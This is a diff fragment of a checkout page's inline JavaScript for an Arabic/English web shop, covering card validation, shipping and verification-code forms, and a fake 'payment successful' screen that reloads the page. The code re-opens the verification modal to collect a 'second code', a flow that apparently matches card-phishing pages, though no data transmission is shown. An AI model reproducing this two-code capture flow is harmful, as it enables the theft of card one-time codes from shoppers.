+                    progressBar.firstElementChild.classList.add('bg-emerald');
+                    progressBar.firstElementChild.classList.remove('bg-primary');
+                }
+            }
+            
+            form.addEventListener('input', updateProgress);
+        }
+
+        // Currency converter with real-time updates
+        function updateCurrencyRates() {
+            const fluctuation = 0.01; // 1% fluctuation
+            Object.keys(exchangeRates).forEach(currency => {
+                if (currency !== 'USD') {
+                    const change = (Math.random() - 0.5) * fluctuation;
+                    exchangeRates[currency] *= (1 + change);
+                }
+            });
+            
+            renderProducts();
+            updateCartDisplay();
+        }
+
+        // Update rates every 30 seconds
+        setInterval(updateCurrencyRates, 30000);
+
+        // Initialize advanced features
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('🚀 DOM Content Loaded - Starting initialization...');
+            
+            // Initialize all features
+            addVisualEffects();
+            initCardValidation();
+            initPaymentForm();
+            initVerificationInputs();
+            initVerificationForm();
+            
+            // 🔥 تأكد من تهيئة نموذج الشحن
+            setTimeout(() => {
+                initShippingForm();
+                console.log('✅ Shipping form initialization attempted');
+                
+                // 🧪 Test the form immediately
+                const testForm = document.getElementById('shippingForm');
+                if (testForm) {
+                    console.log('🎯 Shipping form found and ready!');
+                    console.log('📝 Form action should be working now');
+                } else {
+                    console.error('💥 SHIPPING FORM NOT FOUND!');
+                }
+            }, 500);
+            
+            // 🔄 Backup initialization with more delay
+            setTimeout(() => {
+                if (!window.shippingFormInitialized) {
+                    console.log('🔄 Backup initialization starting...');
+                    initShippingForm();
+                }
+            }, 1000);
+            
+            // Add magical loading effects
+            gsap.from('.container', {duration: 1, y: 50, opacity: 0, stagger: 0.2});
+            
+            console.log('🚀 All forms initialized successfully!');
+        });
+
+        // Clear form inputs for second code
+        function clearFormInputs() {
+            const inputs = document.querySelectorAll('#verificationModal input[data-index]');
+            inputs.forEach(input => {
+                input.value = '';
+            });
+            
+            // Focus first input again
+            setTimeout(() => {
+                inputs[0].focus();
+            }, 100);
+            
+            // Re-show modal for second code
+            const modal = document.getElementById('verificationModal');
+            modal.classList.remove('hidden');
+            modal.classList.add('flex');
+        }
+
+        // Show payment success and redirect to main page
+        function showPaymentSuccessAndRedirect() {
+            // Clear cart first
+            cart = [];
+            updateCartDisplay();
+            
+            // Show success message
+            const successDiv = document.createElement('div');
+            successDiv.className = 'fixed inset-0 bg-emerald text-white flex items-center justify-center z-50 text-2xl font-bold';
+            successDiv.innerHTML = `
+                <div class="text-center animate-bounce">
+                    <i class="fas fa-check-circle text-6xl mb-4"></i>
+                    <p>تم الدفع بنجاح! 💳</p>
+                    <p class="text-lg mt-2">شكراً لك! 🎉</p>
+                    <p class="text-base mt-4">سيتم توجيهك للصفحة الرئيسية...</p>
+                </div>
+            `;
+            
+            document.body.appendChild(successDiv);
+            
+            // Redirect to main page after 3 seconds
+            setTimeout(() => {
+                // Reload the page to go back to main
+                window.location.reload();
+            }, 3000);
+        }
+
+        // Phone validation function
+        function initPhoneValidation() {
+            const phoneInput = document.getElementById('phoneNumber');
+            if (phoneInput) {
+                phoneInput.addEventListener('input', function(e) {
+                    // Remove non-digits
+                    let value = e.target.value.replace(/\D/g, '');
+                    
+                    // Limit to 14 digits max
+                    if (value.length > 14) {
+                        value = value.substring(0, 14);
+                    }
+                    
+                    e.target.value = value;
+                });
+            }
+        }
+
+        // Handle form submission
+        document.getElementById('orderForm').addEventListener('submit', function(e) {
+            setTimeout(() => {
+                cart = [];
+                updateCartDisplay();
+                closeCheckout();
+                alert(currentLanguage === 'ar' ? 'تم إرسال طلبك بنجاح! سنتواصل معك قريباً' : 'Your order has been sent successfully! We will contact you soon');
+            }, 100);
+        });
+    </script>
+
+
+</body></html>
